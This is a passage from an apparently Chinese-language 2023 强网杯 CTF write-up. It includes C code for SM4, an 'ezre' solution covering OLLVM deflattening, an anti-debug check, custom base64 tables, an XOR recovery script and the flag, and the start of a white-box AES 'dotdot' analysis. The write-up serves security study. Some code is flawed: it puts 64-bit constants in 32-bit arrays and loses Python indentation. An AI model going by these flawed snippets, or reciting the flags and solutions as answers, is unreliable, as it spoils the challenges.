class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,</span><br><span class="line">    <span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span></span><br><span class="line">};</span><br><span class="line"><span class="comment">//const unsigned int Rotl(unsigned int n,int b){ return n&lt;&lt;b|n&gt;&gt;(32-b); } </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> xx[<span class="number">32</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">SM4KeyExt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* key, <span class="type">unsigned</span> <span class="type">int</span>* rk, <span class="type">unsigned</span> <span class="type">int</span> CryptFlag)</span> {<span class="comment">//秘钥扩展算法,flag为1代表解密 </span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r, tmp, k[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) k[i] = key[i] ^ RK[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) {</span><br><span class="line">            k[j] ^= L2((<span class="type">unsigned</span> <span class="type">int</span>)SboxTrans(k[(j + <span class="number">1</span>) % <span class="number">4</span>] ^ k[(j + <span class="number">2</span>) % <span class="number">4</span>] ^ k[(j + <span class="number">3</span>) % <span class="number">4</span>] ^ CK[i + j]));</span><br><span class="line">            rk[i + j] = k[j];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (CryptFlag == <span class="number">1</span>) <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">16</span>; r++) swap(rk[r], rk[<span class="number">31</span> - r]);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SM4Crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* Input, <span class="type">unsigned</span> <span class="type">int</span>* Output, <span class="type">unsigned</span> <span class="type">int</span>* rk)</span> {</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tmp, x[<span class="number">4</span>], * y;</span><br><span class="line">    y = (<span class="type">unsigned</span> <span class="type">int</span>*)Input;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) x[i] = y[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) {</span><br><span class="line">            x[j] ^= L1((<span class="type">unsigned</span> <span class="type">int</span>)SboxTrans(x[(j + <span class="number">1</span>) % <span class="number">4</span>] ^ x[(j + <span class="number">2</span>) % <span class="number">4</span>] ^ x[(j + <span class="number">3</span>) % <span class="number">4</span>] ^ rk[i + j]));</span><br><span class="line">            xx[i + j] = x[j];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    y = (<span class="type">unsigned</span> <span class="type">int</span>*)Output;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) y[i] = x[<span class="number">3</span> - i];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = { <span class="number">0x01234567</span>,<span class="number">0x89abcdef</span>,<span class="number">0x01234567</span>,<span class="number">0x89abcdef</span>, };</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> miwen[<span class="number">4</span>] = { <span class="number">0x067519471663887C</span>,<span class="number">0x8B6655FF3F7D0D4A</span>,<span class="number">0xF5D24E383FE9C2DE</span>,<span class="number">0xDB7C7F6F74B11F3C</span> };</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mingwen[<span class="number">4</span>] = { <span class="number">0x01234567</span>,<span class="number">0x89abcdef</span>,<span class="number">0xfedcba98</span>,<span class="number">0x76543210</span> };</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> rk[<span class="number">32</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> output[<span class="number">4</span>] = {};</span><br><span class="line"><span class="type">void</span> <span class="title function_">solve1</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"题目1:\n"</span>);</span><br><span class="line">    SM4KeyExt(key, rk, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"rk数组:\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) <span class="built_in">printf</span>(<span class="string">"%08x\n"</span>, rk[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"x数组：\n"</span>);</span><br><span class="line">    SM4Crypt(mingwen, output, rk);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) <span class="built_in">printf</span>(<span class="string">"%08x\n"</span>, xx[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"结果：\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) <span class="built_in">printf</span>(<span class="string">"%08x "</span>, output[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">solve2</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"题目2：\n"</span>);</span><br><span class="line">    SM4KeyExt(key, rk, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) {</span><br><span class="line">        SM4Crypt(mingwen, mingwen, rk);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) <span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; mingwen[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="comment">//freopen("out.txt","w",stdout);</span></span><br><span class="line">    solve1();</span><br><span class="line">    solve2();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="ezre-强网先锋"><a href="#ezre-强网先锋" class="headerlink" title="ezre-强网先锋"></a>ezre-强网先锋</h1><p>打开题目发现是ollvm平坦化混淆。<img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps16.jpg" alt="img"></p><p>可以使用插件D810去控制流平坦化</p><p>使用前提：angr要装好</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps17.jpg" alt="img"> </p><p>也可以使用OLLVM去除 <a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a> 中的混淆。</p><p>可以使用以下Python命令进行操作：python deflat.py -f ezre –addr 0xxxxxxxx。</p><p>去完混淆分析代码，发现就是经过5次bas加解密，问题在于密文</p><p>交叉引用，有个反调试</p><p>审计发现，如果赋值为1，则修改密文</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps18.jpg" alt="img"> </p><p>那么我们可以动调，在main函数把base的table取出</p><p>通过异或得到密文</p><p>然后复现加密流程，经过5次加解密得到flag</p><p>这个是main函数中调用的Base加密函数</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps19.jpg" alt="img"> </p><p>这个是动调出来的base的table</p><p>From base64</p><p>plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6</p><p>To base64</p><p>pnHQwlAveo4DhGg1jE3SsIqJ2mrzxCiNb+Mf0YVd5L8c97/WkOTtuKFZyRBUPX6a</p><p>From base64</p><p>Hc0xwuZmy3DpQnSgj2LhUtrlVvNYks+BX/MOoETaKqR4eb9WF8ICGzf6id1P75JA</p><p>To base64</p><p>FGseVD3ibtHWR1czhLnUfJK6SEZ2OyPAIpQoqgY0w49u+7rad5CxljMXvNTBkm/8</p><p>From base64</p><p>l+USN4J5Rfj0TaVOcnzXiPGZIBpoAExuQtHyKD692hwmqe7/Mgk8v1sdCW3bYFLr</p><p>这是反解密文的脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">k=[<span class="number">109</span>,<span class="number">76</span>,<span class="number">22</span>,<span class="number">73</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">74</span>,<span class="number">78</span>,<span class="number">16</span>,<span class="number">98</span>,<span class="number">22</span>,<span class="number">109</span>,<span class="number">16</span>,<span class="number">126</span>,<span class="number">78</span>,<span class="number">109</span>,<span class="number">76</span>,<span class="number">22</span>,<span class="number">73</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">74</span>,<span class="number">78</span>,<span class="number">16</span>,<span class="number">98</span>,<span class="number">22</span>,<span class="number">109</span>,<span class="number">16</span>,<span class="number">126</span>,<span class="number">78</span>,<span class="number">109</span>,<span class="number">76</span>,<span class="number">22</span>,<span class="number">73</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">74</span>,<span class="number">78</span>,<span class="number">16</span>,<span class="number">98</span>,<span class="number">22</span>,<span class="number">109</span>,<span class="number">16</span>,<span class="number">126</span>,<span class="number">78</span>,<span class="number">109</span>,<span class="number">76</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">enc=[<span class="number">0x3A</span>,<span class="number">0x2C</span>,<span class="number">0x4B</span>,<span class="number">0x51</span>,<span class="number">0x68</span>,<span class="number">0x46</span>,<span class="number">0x59</span>,<span class="number">0x63</span>,<span class="number">0x24</span>,<span class="number">0x04</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x5E</span>,<span class="number">0x5f</span>,<span class="number">0x00</span>,<span class="number">0x0C</span>,<span class="number">0x2B</span>,<span class="number">0x03</span>,<span class="number">0x29</span>,<span class="number">0x5C</span>,<span class="number">0x74</span>,<span class="number">0x70</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6A</span>,<span class="number">0x62</span>,<span class="number">0x7F</span>,<span class="number">0x3D</span>,<span class="number">0x2C</span>,<span class="number">0x4E</span>,<span class="number">0x6F</span>,<span class="number">0x13</span>,<span class="number">0x06</span>,<span class="number">0x0D</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x06</span>,<span class="number">0x0C</span>,<span class="number">0x4D</span>,<span class="number">0x56</span>,<span class="number">0x0f</span>,<span class="number">0x28</span>,<span class="number">0x4D</span>,<span class="number">0x51</span>,<span class="number">0x76</span>,<span class="number">0x70</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x2B</span>,<span class="number">0x05</span>,<span class="number">0x51</span>,<span class="number">0x68</span>,<span class="number">0x48</span>,<span class="number">0x55</span>,<span class="number">0x24</span>,<span class="number">0x19</span>]</span><br><span class="line"></span><br><span class="line">enc2=[<span class="number">0x3A</span>,<span class="number">0x2C</span>,<span class="number">0x4B</span>,<span class="number">0x51</span>,<span class="number">0x68</span>,<span class="number">0x46</span>,<span class="number">0x59</span>,<span class="number">0x63</span>,<span class="number">0x24</span>,<span class="number">0x04</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x5E</span>,<span class="number">0x5f</span>,<span class="number">0x00</span>,<span class="number">0x0C</span>,<span class="number">0x2B</span>,<span class="number">0x03</span>,<span class="number">0x29</span>,<span class="number">0x5C</span>,<span class="number">0x74</span>,<span class="number">0x70</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6A</span>,<span class="number">0x62</span>,<span class="number">0x7F</span>,<span class="number">0x3D</span>,<span class="number">0x2C</span>,<span class="number">0x4E</span>,<span class="number">0x6F</span>,<span class="number">0x13</span>,<span class="number">0x06</span>,<span class="number">0x0D</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x06</span>,<span class="number">0x0C</span>,<span class="number">0x4D</span>,<span class="number">0x56</span>,<span class="number">0x0f</span>,<span class="number">0x28</span>,<span class="number">0x4D</span>,<span class="number">0x51</span>,<span class="number">0x76</span>,<span class="number">0x70</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x2B</span>,<span class="number">0x05</span>,<span class="number">0x51</span>,<span class="number">0x68</span>,<span class="number">0x48</span>,<span class="number">0x55</span>,<span class="number">0x24</span>,<span class="number">0x19</span>]</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">  enc[i + <span class="number">1</span>]=enc[i +<span class="number">1</span>]^enc2[i]</span><br><span class="line"></span><br><span class="line">  enc[i]=enc[i]^k[i]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">hex</span>(enc[i]),end=<span class="string">','</span>)</span><br><span class="line"></span><br><span class="line">  enc[-<span class="number">1</span>]=enc2[-<span class="number">1</span>]^enc2[-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">hex</span>(enc[-<span class="number">1</span>]))</span><br></pre></td></tr></tbody></table></figure><p>得出密文</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps20.jpg" alt="img"> </p><p>0x57,0x3d</p><p>0x5a,0x3d</p><p>0x71,0x3d</p><p>0x53,0x3d</p><p>0x57,0x3d</p><p>0x63,0x3d</p><p>0x55,0x3d</p><p>0x74,0x3d</p><p>0x57,0x3d</p><p>0x42,0x3d</p><p>0x4c,0x3d</p><p>0x6c,0x3d</p><p>0x4f,0x3d</p><p>0x72,0x3d</p><p>0x69,0x3d</p><p>0x45,0x3d</p><p>0x66,0x3d</p><p>0x63,0x3d</p><p>0x61,0x3d</p><p>0x6a,0x3d</p><p>0x57,0x3d</p><p>0x42,0x3d</p><p>0x53,0x3d</p><p>0x52,0x3d</p><p>0x73,0x3d</p><p>0x74,0x3d</p><p>0x4c,0x3d</p><p>0x6c,0x3d</p><p>0x6b,0x3d</p><p>0x45,0x3d</p><p>0x66,0x3d</p><p>0x46,0x3d</p><p>0x57,0x3d</p><p>0x52,0x3d</p><p>0x37,0x3d</p><p>0x6a,0x3d</p><p>0x2f,0x3d</p><p>0x52,0x3d</p><p>0x37,0x3d</p><p>0x64,0x3d</p><p>0x4d,0x3d</p><p>0x43,0x3d</p><p>0x44,0x3d</p><p>0x47,0x3d</p><p>0x6e,0x3d</p><p>0x70,0x3d</p><p>0x3d,0x3d</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/wps21.jpg" alt="img"> </p><p>flag{3ea590ccwxehg715264fzxnzepqz}</p><h1 id="dotdot"><a href="#dotdot" class="headerlink" title="dotdot"></a>dotdot</h1><p>还是可以学到东西的</p><p>因为前期尝试手动解密，对加密的流程有了很深刻理解(</p><h2 id="白盒技术"><a href="#白盒技术" class="headerlink" title="白盒技术"></a><strong>白盒技术</strong></h2><p>白盒密码技术是一项能够抵抗白盒攻击的密码技术。</p><p>白盒攻击是指攻击者对设备终端拥有完全的控制能力，能够观测和更改程序运行时的内部数据。</p><p>这种攻击环境称为白盒攻击环境。大多智能终端环境(Android、iOS等)在很多情况下就是一个白</p><p>盒攻击环境。</p><p>大概就是这样</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/image-20240627145653200.png" alt="image-20240627145653200"></p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/image-20240627145717595.png" alt="image-20240627145717595"></p><p>主要还是 AAA -&gt; AES白盒加密</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/image-20240627145735745.png" alt="image-20240627145735745"></p><h2 id="前期铺垫"><a href="#前期铺垫" class="headerlink" title="前期铺垫"></a>前期铺垫</h2><p>将复杂的加密修改成简单的步骤</p><p>当没有chang_index函数时，加密就变成了4字节为单位进行加密了。</p><p>下面是我将题目给的代码，进行了修改，然后整理如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#input = [i for i in range(97, 97 + 16)]</span></span><br><span class="line"><span class="built_in">input</span>=[<span class="number">1</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AAA</span>():</span><br><span class="line"><span class="keyword">global</span> <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="comment">#16个 字符</span></span><br><span class="line">num = table1[i][<span class="number">4</span> * j][<span class="built_in">input</span>[<span class="number">4</span> * j]]</span><br><span class="line">num2 = table1[i][<span class="number">4</span> * j + <span class="number">1</span>][<span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">1</span>]]</span><br><span class="line">num3 = table1[i][<span class="number">4</span> * j + <span class="number">2</span>][<span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">2</span>]]</span><br><span class="line">num4 = table1[i][<span class="number">4</span> * j + <span class="number">3</span>][<span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">3</span>]]</span><br><span class="line">num5 = table2[i][<span class="number">24</span> * j][(num &gt;&gt; <span class="number">28</span> &amp; <span class="number">15</span>)][(num2 &gt;&gt; <span class="number">28</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num6 = table2[i][<span class="number">24</span> * j + <span class="number">1</span>][(num3 &gt;&gt; <span class="number">28</span> &amp; <span class="number">15</span>)][(num4 &gt;&gt; <span class="number">28</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num7 = table2[i][<span class="number">24</span> * j + <span class="number">2</span>][(num &gt;&gt; <span class="number">24</span> &amp; <span class="number">15</span>)][(num2 &gt;&gt; <span class="number">24</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num8 = table2[i][<span class="number">24</span> * j + <span class="number">3</span>][(num3 &gt;&gt; <span class="number">24</span> &amp; <span class="number">15</span>)][(num4 &gt;&gt; <span class="number">24</span> &amp; <span class="number">15</span>)]</span><br><span class="line"><span class="built_in">input</span>[<span class="number">4</span> * j] = (table2[i][<span class="number">24</span> * j + <span class="number">4</span>][num5][num6] &lt;&lt; <span class="number">4</span> | table2[i][<span class="number">24</span></span><br><span class="line">* j + <span class="number">5</span>][num7][num8])</span><br><span class="line">num5 = table2[i][<span class="number">24</span> * j + <span class="number">6</span>][(num &gt;&gt; <span class="number">20</span> &amp; <span class="number">15</span>)][(num2 &gt;&gt; <span class="number">20</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num6 = table2[i][<span class="number">24</span> * j + <span class="number">7</span>][(num3 &gt;&gt; <span class="number">20</span> &amp; <span class="number">15</span>)][(num4 &gt;&gt; <span class="number">20</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num7 = table2[i][<span class="number">24</span> * j + <span class="number">8</span>][(num &gt;&gt; <span class="number">16</span> &amp; <span class="number">15</span>)][(num2 &gt;&gt; <span class="number">16</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num8 = table2[i][<span class="number">24</span> * j + <span class="number">9</span>][(num3 &gt;&gt; <span class="number">16</span> &amp; <span class="number">15</span>)][(num4 &gt;&gt; <span class="number">16</span> &amp; <span class="number">15</span>)]</span><br><span class="line"><span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">1</span>] = (table2[i][<span class="number">24</span> * j + <span class="number">10</span>][num5][num6] &lt;&lt; <span class="number">4</span> | table2</span><br><span class="line">[i][<span class="number">24</span> * j + <span class="number">11</span>][num7][num8])</span><br><span class="line">num5 = table2[i][<span class="number">24</span> * j + <span class="number">12</span>][(num &gt;&gt; <span class="number">12</span> &amp; <span class="number">15</span>)][(num2 &gt;&gt; <span class="number">12</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num6 = table2[i][<span class="number">24</span> * j + <span class="number">13</span>][(num3 &gt;&gt; <span class="number">12</span> &amp; <span class="number">15</span>)][(num4 &gt;&gt; <span class="number">12</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num7 = table2[i][<span class="number">24</span> * j + <span class="number">14</span>][(num &gt;&gt; <span class="number">8</span> &amp; <span class="number">15</span>)][(num2 &gt;&gt; <span class="number">8</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num8 = table2[i][<span class="number">24</span> * j + <span class="number">15</span>][(num3 &gt;&gt; <span class="number">8</span> &amp; <span class="number">15</span>)][(num4 &gt;&gt; <span class="number">8</span> &amp; <span class="number">15</span>)]</span><br><span class="line"><span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">2</span>] = (table2[i][<span class="number">24</span> * j + <span class="number">16</span>][num5][num6] &lt;&lt; <span class="number">4</span> | table2[i][<span class="number">24</span> * j + <span class="number">17</span>][num7][num8])</span><br><span class="line">num5 = table2[i][<span class="number">24</span> * j + <span class="number">18</span>][(num &gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>)][(num2 &gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num6 = table2[i][<span class="number">24</span> * j + <span class="number">19</span>][(num3 &gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>)][(num4 &gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>)]</span><br><span class="line">num7 = table2[i][<span class="number">24</span> * j + <span class="number">20</span>][(num &amp; <span class="number">15</span>)][(num2 &amp; <span class="number">15</span>)]</span><br><span class="line">num8 = table2[i][<span class="number">24</span> * j + <span class="number">21</span>][(num3 &amp; <span class="number">15</span>)][(num4 &amp; <span class="number">15</span>)]</span><br><span class="line"><span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">3</span>] = (table2[i][<span class="number">24</span> * j + <span class="number">22</span>][num5][num6] &lt;&lt; <span class="number">4</span> | table2</span><br><span class="line">[i][<span class="number">24</span> * j + <span class="number">23</span>][num7][num8])</span><br><span class="line">AAA()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(i),end=<span class="string">','</span>)</span><br><span class="line">crypto=[<span class="number">0x4e</span>,<span class="number">0xdc</span>,<span class="number">0x24</span>,<span class="number">0x8f</span>,<span class="number">0x26</span>,<span class="number">0xd2</span>,<span class="number">0xd9</span>,<span class="number">0x1d</span>,<span class="number">0xf1</span>,<span class="number">0xce</span>,<span class="number">0x84</span>,<span class="number">0xfa</span>,<span class="number">0xf1</span>,<span class="number">0x5</span>,<span class="number">0xe</span>,</span><br><span class="line"><span class="number">0x41</span>]</span><br></pre></td></tr></tbody></table></figure><p><strong>改成这样，就变成了</strong>4字节爆破。</p><p><strong>发现改变</strong>1个字节（4个字节单位）发生变化</p><p><img src="/2023/12/18/2023%E5%BC%BA%E7%BD%91%E6%9D%AFWriteUp/image-20240725120303602.png" alt="image-20240725120303602"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 